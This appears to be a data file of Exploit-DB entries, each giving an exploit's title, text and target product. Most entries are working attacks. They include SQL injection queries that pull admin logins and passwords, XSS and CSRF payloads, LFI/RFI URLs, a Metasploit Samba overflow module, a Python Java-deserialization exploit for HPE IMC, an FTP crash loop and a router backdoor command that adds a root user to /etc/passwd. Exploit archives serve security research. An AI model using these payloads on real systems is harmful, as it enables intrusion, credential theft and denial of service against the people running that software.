1547,"Aztek Forum 4.00 - Cross-Site Scripting / SQL Injection /*==========================================*/ // AZTEK forums 4.0 multiple vulnerabilities (PoC) // Product: AZTEK forums // URL: http://www.forum-aztek.com/ // RISK: high /*==========================================*/  [PoC]  1- XSS 	- Post a message including the following line: &lt;/textarea&gt;'""><script>alert(document.cookie)</script> 	- Valid. 	- Click on ""Citer"" to execute the script.  	You can also do it with the edit button (after loging in).  2- 	Do the following request : http://SOME_HOST/forum/index.php?msg=*/* 	It will dump a MySQL error message which can dump login:pw infos.  3- 	- Register with : 	login : 6b 66 73 6a 64 61 20 54 50 68 70 45 72 72 6f 72 45 78 63 65 	70 74 69 6f 6e 0d 0a 44 65 73 63 72 69 70 74 69 6f 6e 0d 0a 5b 57 61 	72 6e 69 6e 67 5d 20 6d 79 73 71 6c 5f 63 6f 6e 6e 65 63 74 28 29 20 	5b 3c 61 20 68 72 65 66 3d 27 66 75         [...a huge login name...] 	6e 63 74 69 6f 6e 2e 6d 79 73 71 6c 2d 63 6f 6e 6e 65 63 74 27 3e 66 	75 6e 63 74 69 6f 6e 2e 6d 79 73 71 6c 2d 63 6f 6e 	passwd:blabla 	email:blabla@gmail.com 	- Valid.  	This form is not validated at all, so it can cause a MySQL error like :  	Mysql error in file  	/home/httpd/vhosts/www.**********.com/web/forum/index/actions.php in 	function subscribe at line 222  	Mysql query error : 	INSERT INTO atk_users (login,owner,passwd,email,show_email,alert_mp,subscribe) 		VALUES ('6b 66 73 6a 64 61 20 54 50 68  	[...]','admin','atHax4CLQE42Q','blabla@gmail.com','1','1','1141202540')  	Please note this error and contact your administrator.  -- PoC by lorenzo [GHT], http://ght.c.la/  # milw0rm.com [2006-03-02]",Aztek Forum,1
34714,Freelancers - 'post_resume.php?jobid' Cross-Site Scripting source:  https://www.securityfocus.com/bid/43475/info   FreeWebScriptz Freelancer Script is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.   An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.   FreeWebScriptz Freelancer Script 1.0 is vulnerable; other versions may also be affected.   http://www.example.com/script/freelancer/post_resume.php?jobid= ADD THIS XSS: 1<script>alert(372848775668)</script>,FreeWebScriptz Freelancer Script,1
34520,"Oracle MySQL 5.1.48 - 'HANDLER' Interface Denial of Service source: https://www.securityfocus.com/bid/42633/info  MySQL is prone to a denial-of-service vulnerability.  An attacker can exploit this issue to crash the database, denying access to legitimate users.  This issue affects versions prior to MySQL 5.1.49.  NOTE: This issue was previously covered in BID 42586 (Oracle MySQL Prior to 5.1.49 Multiple Denial Of Service Vulnerabilities) but has been assigned its own record to better document it..   --disable_warnings DROP TABLE IF EXISTS t1; --enable_warnings CREATE TABLE t1  ( pk INT , PRIMARY KEY (pk)); HANDLER t1 OPEN AS handler_a; HANDLER handler_a READ FIRST; HANDLER handler_a READ `PRIMARY` NEXT;  DROP TABLE t1;",Oracle MySQL,1
17356,"MODACOM URoad-5000 1450 - Remote Command Execution / Backdoor Access       ================================================      == Alex Stanev Security Advisory #4 @31.05.2011 ==      ==             http://sec.stanev.org            ==       ================================================  PRODUCT      URoad-5000  VENDOR      MODACOM [http://www.modacom.co.kr]  VERSIONS AFFECTED      v1450  CLASS      Remote command execution/Backdoor  PRODUCT DESCRIPTION      URoad-5000 is integrated battery powered wireless router. It comes with only one external USB      interface and no other hardware comm interfaces (such as ethernet). Based on RaLink SoC 3050.      The USB port is used for connection with MW-U3050, which is USB WiMAX dongle.      Linux inside.      Often marketed as WiMAX 2 WiFi ""converter"".  THE PROBLEM      The box uses modified version of RaLink SDK. The standard web interface is accessed via HTTP.      1) Web administration interface can be accessed with standard user/password pair admin:admin      This can be later changed, but there is another possible access pair - engineer:engineer      and it can't be changed via the web interface.      2) Some of the SDK standard scripts are left and their screens in the web interface are just      HTML commented. This reveals the /goform/SystemCommand method.  EXPLOIT      1) Remote add r00t user with password boza           $curl --basic -u ""engineer:engineer"" \ 	        -d ""command=echo -e \""r00t:CRYM.sLY1U1AI:0:0:Adminstrator:/:/bin/sh\"" >> /etc/passwd;&SystemCommandSubmit=Apply"" \ 	        192.168.100.254/goform/SystemCommand           $telnet 192.168.100.254           Trying 192.168.100.254...           Connected to 192.168.100.254.           modacom login: r00t           Password: boza           BusyBox v1.12.1 (2010-03-05 21:33:57 KST) built-in shell (ash)           Enter 'help' for a list of built-in commands.           #  ADDITIONAL INFO      The flaw was presented on OpenFest 2010.      Presentation: http://openfest.org/files/slides-2010/OpenFest2010_Reverse_engineering_Alex_Stanev.pdf [in bulgarian]  PATCH/WORKAROUND      No workaround possible. Next version?  VENDOR STATUS      NOT informed. Backdoor.       =========================     ==           EOF         ==     == http://sec.stanev.org ==      =========================",MODACOM URoad-5000,1
25050,"Microsoft Windows XP/2000/2003 - 'winhlp32' Phrase Heap Overflow source: https://www.securityfocus.com/bid/12092/info  Microsoft Windows is prone to a heap-based buffer overflow vulnerability. This issue exists in 'winhlp32.exe' and is exposed when a malformed phrase compressed Windows Help file (.hlp) is processed by the program.  Successful exploitation may allow execution of arbitrary code in the context of the user that opens the malicious Help file. The Help file may originate from an external or untrusted source, so this vulnerability is considered remote in nature.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/25050.gz",Microsoft Windows,1
15218,"xWeblog 2.2 - 'oku.asp?makale_id' SQL Injection =================================================== xWeblog v2.2 - Remote SQL Injection Vulnerability (tr)  ===================================================  ~~~~~~~~~~~~~~~[My]~~~~~~~~~~~~~~~~~~~~~~~~~~~~ [+] Author : KnocKout [~] Contact : knockoutr@msn.com ~~~~~~~~~~~~~~~~[Software info]~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~Web App. : xWeblog v2.2 ~Software: http://www.aspdunyasi.com/goster.asp?id=19 ~Vulnerability Style : (SQLi) ~Google Keywords : ""XWEBLOG"" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~       ~~~~~~~~ Explotation ~~~~~~~~~~~       SQL Injection     ================================     http://TARGET/path/oku.asp?makale_id=-67%20UNION%20SELECT+0,AD,SIFRE,3,4,5,6,7,8,9,10,11,12%20from%20uyeler     ================================           [+]  SQL Injected!                             GoodLucK ;)   # Inj3ct0r.com [2010-09-28]",xWeblog,1
9924,"Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit) ## # $Id$ ##  ## # This file is part of the Metasploit Framework and may be subject to  # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##   require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote  	include Msf::Exploit::Remote::SMB  	def initialize(info = {}) 		super(update_info(info,	 			'Name'           => 'Samba trans2open Overflow (Mac OS X)', 			'Description'    => %q{ 				This exploits the buffer overflow found in Samba versions 				2.2.0 to 2.2.8. This particular module is capable of 				exploiting the bug on Mac OS X PowerPC systems. 					 			}, 			'Author'         => [ 'hdm' ], 			'Version'        => '$Revision$', 			'References'     => 				[ 					[ 'CVE', '2003-0201'], 					[ 'OSVDB', '4469'], 					[ 'BID', '7294'], 					[ 'URL', 'http://www.digitaldefense.net/labs/advisories/DDI-1013.txt'],  				], 			'Privileged'     => true, 			'Payload'        => 				{ 					'Space'    => 1024, 					'BadChars' => ""\x00"", 					'MinNops'  => 512,  				}, 			'Platform'       => 'osx', 			'Arch'           => ARCH_PPC, 			'Targets'        =>  				[ 					['Stack Brute Force', { 'Rets' => [0xbffffdfc, 0xbfa00000, 512] } ],  				], 			'DisclosureDate' => 'Apr 7 2003', 			'DefaultTarget' => 0)) 			 			register_options( 				[ 					Opt::RPORT(139) 				], self.class) 	end  	# Need to perform target detection 	def autofilter 		false 	end  	def exploit 		curr_ret = target['Rets'][0] 		while (curr_ret >= target['Rets'][1]) 			break if session_created? 			begin 				print_status(""Trying return address 0x%.8x..."" %  curr_ret)  				connect 				smb_login 	 				# 1988 is required for findrecv shellcode 				pattern = rand_text_english(1988) 	 				# This stream covers the framepointer and the return address 				pattern[1195, 64] = [curr_ret].pack('N') * 16  				# Stuff the shellcode into the request 				pattern[3, payload.encoded.length] = payload.encoded  				trans = 					""\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00""+ 					""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00""+ 					""\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00""+ 					""\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01""+ 					""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""+ 					""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90""+ 					pattern  				sock.put(trans) 				handler 				disconnect 				 			rescue EOFError 			rescue => e 				print_status(""Caught exception: #{e}"") 				break 			end 			curr_ret -= target['Rets'][2] 		end 	end end",Samba,1
42756,"HPE < 7.2 - Java Deserialization #!/usr/bin/env python  ######################################################################################################## #  # HPE/H3C IMC - Java Deserialization Exploit # # Version 0.1 #    Tested on Windows Server 2008 R2 #    Name	HPE/H3C IMC (Intelligent Management Center)	Java 1.8.0_91 # # Author: # Raphael Kuhn (Daimler TSS) #  # Special thanks to: # Jan Esslinger (@H_ng_an) for the websphere exploit this one is based upon # #######################################################################################################  import requests import sys import os import os.path from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  host         = ""127.0.0.1:8080"" payload_file = ""payload.bin"" body        = """"  def printUsage () :     print ""......................................................................................................................""     print "".""     print "". HPE/H3C - IMC Java Deserialization Exploit""     print "".""     print "". Example 1: -payload-binary""     print "". [-] Usage: %s http[s]://<IP>:<PORT> -payload-binary payload"" % sys.argv[0]     print "". [-] Example: %s https://127.0.0.1:8880 -payload-binary ysoserial_payload.bin"" % sys.argv[0]     print "".     1. Create payload with ysoserial.jar (https://github.com/frohoff/ysoserial/releases) ""     print "".        java -jar ysoserial.jar CommonsCollections3 'cmd.exe /c ping -n 1 53.48.79.183' > ysoserial_payload.bin""     print "".     2. Send request to server""     print "".        %s https://127.0.0.1:8880 -payload-binary ysoserial_payload.bin""  % sys.argv[0]     print "".""     print "". Example 2: -payload-string""     print '. [-] Usage: %s http[s]://<IP>:<PORT> -payload-string ""payload""' % sys.argv[0]     print '. [-] Example: %s https://127.0.0.1:8880 -payload-string ""cmd.exe /c ping -n 1 53.48.79.183""' % sys.argv[0]     print "".     1. Send request to server with payload as string (need ysoserial.jar in the same folder)""     print '.        %s https://127.0.0.1:8880 -payload-string ""cmd.exe /c ping -n 1 53.48.79.183""'  % sys.argv[0]     print "".""     print ""......................................................................................................................""  def loadPayloadFile (_fileName) :     print ""[+] Load payload file %s"" % _fileName     payloadFile = open(_fileName, 'rb')     payloadFile_read = payloadFile.read()     return payloadFile_read  def exploit (_payload) :     url = sys.argv[1]     url += ""/imc/topo/WebDMServlet""     print ""[+] Sending exploit to %s"" % (url)      data = _payload     response = requests.post(url, data=data, verify=False)     return response  #def showResponse(_response): #    r = response #    m = r.search(_response) #    if (m.find(""java.lang.NullPointerException"")): #        print ""[+] Found java.lang.NullPointerException, exploit finished successfully (hopefully)"" #    else: #        print ""[-] ClassCastException not found, exploit failed""   if __name__ == ""__main__"":     if len(sys.argv) < 4:         printUsage()         sys.exit(0)     else:         print ""------------------------------------------""         print ""- HPE/H3C - IMC Java Deserialization Exploit -""         print ""------------------------------------------""         host = sys.argv[1]         print ""[*] Connecting to %s"" %host     if sys.argv[2] == ""-payload-binary"":         payload_file = sys.argv[3]         if os.path.isfile(payload_file):             payload = loadPayloadFile(payload_file)             response = exploit(payload)             showResponse(response.content)         else:             print ""[-] Can't load payload file""     elif sys.argv[2] == ""-payload-string"":             if os.path.isfile(""ysoserial.jar""):                 sPayload = sys.argv[3]                 sPayload = ""java -jar ysoserial.jar CommonsCollections5 '"" +sPayload+ ""' > payload.bin""                 print ""[+] Create payload file (%s) "" %sPayload                 os.system(sPayload)                 payload = loadPayloadFile(payload_file)                 response = exploit(payload)                 print ""[+] Response received, exploit finished.""             else:                 print ""[-] Can't load ysoserial.jar""     else:         printUsage()",HPE,1
39797,"Core FTP Server 32-bit Build 587 - Heap Overflow # -*- coding: cp1252 -*- # Exploit Title: Core FTP Server 32-bit - Build 587 Heap Overflow # Date: 05/10/2016 # Exploit Author: Paul Purcell # Contact: ptpxploit at gmail # Vendor Homepage: http://www.coreftp.com/ # Vulnerable Version Download:  http://coreftp.com/server/download/archive/CoreFTPServer587.exe # Version: Core FTP Server 32-bit - Build 587 32-bit # Tested on: Windows XP SP3 x32 English, Windows 7 Pro x64 SP1 English, Windows 10 Pro x64 English # Category: Remote Heap Overflow PoC # # Timeline: 03/03/16 Bug found #           03/04/16 Vender notified #           03/06/16 Vender replied acknowledging the issue #           04/07/16 Vender releases Build 588 which fixes the issue. #           05/10/16 Exploit Released # # Summary:  This exploit allows for a post authentication DOS.  The server does not do proper bounds checking on #           server responses.  In this case, the long 'MODE set to ...' reply invoked by a long TYPE command #           causes a heap overflow and crashes the server process. # #           Crash info: # #           0133FA2C  32 30 30 20 4D 4F 44 45  200 MODE #           0133FA34  20 73 65 74 20 74 6F 20   set to #           0133FA3C  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FA44  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FA4C  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FA54  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FA5C  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FA64  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FA6C  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FA74  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FA7C  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FA84  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FA8C  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FA94  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FA9C  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FAA4  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FAAC  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FAB4  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FABC  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FAC4  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FACC  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FAD4  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FADC  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FAE4  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FAEC  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FAF4  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FAFC  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FB04  41 41 41 41 41 41 41 41  AAAAAAAA #           0133FB0C  58 02 00 00 8E EB 31 57  X..Žë1W # #           00439827   . 8B86 3C040000  MOV EAX,DWORD PTR DS:[ESI+43C]           ;  ESI invalid address: DS:[4141457D]=??? #           0043982D   . 85C0           TEST EAX,EAX # #           DS:[4141457D]=??? #           EAX=00000000 # #           EAX 00000000 #           ECX 00000000 #           EDX 00000001 #           EBX 01141B90 #           ESP 0142C06C #           EBP 0143FB3C #           ESI 41414141 #           EDI 00000000 #           EIP 00439827 coresrvr.00439827 #           C 1  ES 0023 32bit 0(FFFFFFFF) #           P 1  CS 001B 32bit 0(FFFFFFFF) #           A 1  SS 0023 32bit 0(FFFFFFFF) #           Z 0  DS 0023 32bit 0(FFFFFFFF) #           S 1  FS 003B 32bit 7FFD8000(FFF) #           T 1  GS 0000 NULL #           D 0 #           O 0  LastErr ERROR_SUCCESS (00000000) #           EFL 00000397 (NO,B,NE,BE,S,PE,L,LE) #           ST0 empty #           ST1 empty #           ST2 empty #           ST3 empty #           ST4 empty #           ST5 empty #           ST6 empty #           ST7 empty #                          3 2 1 0      E S P U O Z D I #           FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT) #           FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1  import time import socket from ftplib import FTP  host='yourhost'             #host or IP port=21                     #port u=""youruser""                #username p=""yourpass""                #password pause=3                     #pause between login & command attempts, normally 3 seconds is plenty of time. command=""TYPE "" evil=""A""*211                #Any more, and the program warns of buffer overflow attempt and ignores the command evilTYPE=(command+evil)     #Evil type command  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) open = sock.connect_ex((host,port)) sock.close()  if (open == 0):     print ""FTP is up, lets fix that...""     while (open != 10061):         print ""Connecting to send evil TYPE command...""         ftp = FTP()         ftp.connect(host,port)         ftp.login(u,p)         ftp.sendcmd(evilTYPE)         ftp.close()         time.sleep(pause)         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         open = sock.connect_ex((host,port))         sock.close()     print ""No more files for you!"" else:     print ""Port ""+str(port)+"" does not seem to be open on ""+host",Core FTP Server 32bit,1
43976,"Joomla! Component Zh GoogleMap 8.4.0.0 - SQL Injection <!-- # # # # # # Exploit Title: Joomla! Component Zh GoogleMap 8.4.0.0 - SQL Injection # Dork: N/A # Date: 04.02.2018 # Vendor Homepage: http://zhuk.cc/ # Software Link: https://extensions.joomla.org/extensions/extension/maps-a-weather/maps-a-locations/zh-googlemap/ # Software Download: http://zhuk.cc/files/pkg_zhgooglemap-j30-8.4.0.0-final.zip # Version: 8.4.0.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: CVE-2018-6582 # # # # # # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Social: @ihsansencan # Want To Donate ? # BTC : 1NGEp2eNWRCE6gp2i31UPN6G6KBzMDdCyZ # ETH : 0xd606c6b86a1b88c7fcc1f58f7659cfd968449cf2 # # # # # # Description: # The vulnerability allows an attacker to inject sql commands.... #  # Proof of Concept:  #  # # # # # --> <html> <body> <!--com_zhgooglemap/controller.php-->  <!--# 1)--> <!--L 30: public function getPlacemarkDetails() {........}--> <form action=""http://localhost/[PATH]/index.php?option=com_zhgooglemap&no_html=1&format=raw&task=getPlacemarkDetails"" method=""post""> <input name=""id"" value=""-11 UNION ALL SELECT 11,11,11,11,11,11,11,11,CONCAT((SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e116f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11--"" type=""hidden""> <input type=""submit"" value=""1-Ver Ayari""> </form>  <!--# 2)--> <!--L 363: public function getPlacemarkHoverText() {........}--> <form action=""http://localhost/[PATH]/index.php?option=com_zhgooglemap&no_html=1&format=raw&task=getPlacemarkHoverText"" method=""post""> <input name=""id"" value=""-22 UNION ALL SELECT 22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,CONCAT((SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e116f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22--"" type=""hidden""> <input type=""submit"" value=""2-Ver Ayari""> </form>  <!--# 3)--> <!--L 418: public function getPathHoverText() {........}--> <form action=""http://localhost/[PATH]/index.php?option=com_zhgooglemap&no_html=1&format=raw&task=getPathHoverText"" method=""post""> <input name=""id"" value=""-33 UNION ALL SELECT 33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,CONCAT((SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e336f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33,33--"" type=""hidden""> <input type=""submit"" value=""3-Ver Ayari""> </form>  <!--# 4)--> <!--L 763: public function getPathDetails() {........}--> <form action=""http://localhost/[PATH]/index.php?option=com_zhgooglemap&no_html=1&format=raw&task=getPathDetails"" method=""post""> <input name=""id"" value=""-44 UNION ALL SELECT 44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,CONCAT((SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e116f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)),44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44--"" type=""hidden""> <input type=""submit"" value=""4-Ver Ayari""> </form>  </body> </html>",Joomla! Component Zh GoogleMap,1
23800,"Apple Safari 1.x - Cookie Directory Traversal source: https://www.securityfocus.com/bid/9841/info  Multiple vendor Internet Browsers have been reported to be prone to a cookie path argument restriction bypass vulnerability. The issue presents itself due to a failure to properly sanitize encoded URI content, this may make it possible for an attacker to craft a URI that will contain encoded directory traversal sequences sufficient to provide access to a supposedly path exclusive cookie from an alternate path.  http://www.example.com/secure/%2e%2e/sample/insecure.cgi?xss=<golarge>",Apple Safari,1
4719,"Mcms Easy Web Make - 'index.php?template' Local File Inclusion ---------------------------------------------------------------  ____            __________         __             ____  __   /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_  |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\  |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |   |___|___|  /\__|  /______  /\___  >__|            |___||__|            \/\______|      \/     \/                           --------------------------------------------------------------- Http://www.inj3ct-it.org     Staff[at]inj3ct-it[dot]org  ---------------------------------------------------------------   Local File Inclusion --------------------------------------------------------------- # Author: MhZ91 # Title: Mcms Easy Web Make - Local File Inclusion # Download: http://sourceforge.net/projects/easywebmake/ # Bug: Local File Inclusion # Visit: http://www.inj3ct-it.org --------------------------------------------------------------- Only If magic_quotes_gpc is Off Exploit: http://[site]/modules/cms/index.php?template=[LFI]%00 Vuln Code: include""includes/$template/template.config.php""; ---------------------------------------------------------------  # milw0rm.com [2007-12-11]",Mcms Easy Web Make,1
14973,"piwigo-2.1.2 - Multiple Vulnerabilities --=Sql injection=--   http://www.target.com/path/comments.php?keyword=charif38@hotmail.fr&author=sweet&cat=1[SQLi]&since=1&sort_by=date&sort_order=DESC&items_number=5  http://www.target.com/path/picture.php?1sweet[SQLi]&action=rate=0  http://www.target.com/path/index.php?/search/10[SQli]   --=Stored Xss=--  Admin login required Attack pattern : >'<script>alert(""Sweet"")</script>  http://www.target.com/path/admin.php?page=tags  The POST variable ""Nouveau tag"" is vulnerable to a stored xss attack  http://www.target.com/path/admin.php?page=cat_list  The POST variable ""Ajouter une catégorie virtuelle"" is vulnerable to a stored xss attack    --=CSRF=-- Change admin password exploit  <html> <body> <h1>Piwigo-2.1.2 Change admin password CSRF </h1> <form method=""POST"" name=""form0"" action=""http://www.target.com/path/admin.php?page=profile&user_id=1""> <input type=""hidden"" name=""redirect"" value=""admin.php?page""/> <input type=""hidden"" name=""mail_address"" value=""charif38@hotmail.fr""/> <!-- Your email here --> <input type=""hidden"" name=""use_new_pwd"" value=""sweet""/> <!-- Your password here --> <input type=""hidden"" name=""passwordConf"" value=""sweet""/> <!-- Your password here --> <input type=""hidden"" name=""nb_image_line"" value=""5""/> <input type=""hidden"" name=""nb_line_page"" value=""3""/> <input type=""hidden"" name=""theme"" value=""Sylvia""/> <input type=""hidden"" name=""language"" value=""fr_FR""/> <input type=""hidden"" name=""recent_period"" value=""7""/> <input type=""hidden"" name=""expand"" value=""false""/> <input type=""hidden"" name=""show_nb_comments"" value=""false""/> <input type=""hidden"" name=""show_nb_hits"" value=""false""/> <input type=""hidden"" name=""maxwidth"" value=""""/> <input type=""hidden"" name=""maxheight"" value=""""/> <p> Push the Button <input type=""submit"" name=""validate"" value=""Valider""/> </p> </form> <form method=""GET"" name=""form1"" action=""http://www.target.com/path/admin.php?page=user_list""> <input type=""hidden"" name=""name"" value=""value""/>  </form> </body> </html>   [ thx and RIP to Milw0rm.com , JF - Hamst0r - Keystroke you always be right here 3> ] , inj3ct0r.com , exploit-db.com   1,2,3 VIVA LALGERIE",piwigo-2.1.2,0
34373,"MC Content Manager 10.1 - SQL Injection / Cross-Site Scripting source: https://www.securityfocus.com/bid/41949/info  MC Content Manager is prone to an SQL-injection vulnerability and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.  Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   Cross site scripting:  1) http://www.example.com/article.php?root=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E  2) http://www.example.com/static.php?page=1%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E  3) http://www.example.com/cms/%3Cbody%20onload=alert(document.cookie)%3E/  SQL Injection:  1) http://www.example.com/cms/ua%20where%201=1--%20/",MC Content Manager,1
26373,MySource 2.14 - 'mime.php?PEAR_PATH' Remote File Inclusion source: https://www.securityfocus.com/bid/15133/info          MySource is prone to multiple remote and local file include vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.          An attacker may leverage any of these issues to execute arbitrary server-side script code on an affected computer with the privileges of the Web server process. This may facilitate unauthorized access.   http://www.example.com/pear/Mail_Mime/mime.php?PEAR_PATH=http://www.example.com/[file]?,MySource,1
20618,"IBM Net.Commerce 2.0/3.x/4.x - orderdspc.d2w order_rn Option SQL Injection source: https://www.securityfocus.com/bid/2350/info  IBM's Net.Commerce ecommerce platform supports macros which, by default, do not properly validate requests in user-supplied input. A thoughtfully-formed request to a vulnerable script can cause the server to disclose sensitive system information, including results of arbitrary queries to the Net.Commerce database. This can allow an attacker to obtain an elevation of privileges to that of the DB2INST1 account, and potentially issue arbitrary shell commands as the DB2INST1 user.  IBM fixed the vulnerable macros they ship with the product in Net.Commerce Versions 3.2 and WebSphere Commerce Suite 4.1. Custom macros created by the user may be vulnerable to this type of attack. WebSphere Commerce Suite Version 5.1 is not vulnerable at all as it does not use Net.Data macros.   To obtain the administrator accounts use the following URL:  http://target/cgi-bin/ncommerce3/ExecMacro/orderdspc.d2w/report?order_rn=99999+union+select+shlogid+as+mestname,0+from+shopper+where+shshtyp+%3d+'A';  To obtain the encrypted passwords use the following URL:  http://target/cgi-bin/ncommerce3/ExecMacro/orderdspc.d2w/report?order_rn=99999+union+select+shlpswd+as+mestname,0+from+shopper+where+shlogid+%3d+'ncadmin';  To obtain the password reminders use the following URL: http://target/cgi-bin/ncommerce3/ExecMacro/orderdspc.d2w/report?order_rn=99999+union+select+shchaans+as+mestname,0+from+shopper+where+shlogid+%3d+'ncadmin';  ""orderdspc.d2w"" is not the only vulnerable macro. It is just used as an example. Casting between different data-types is possible. Read the DB2 manual pages.  It may also be possible to query other databases.",IBM Net.Commerce,1
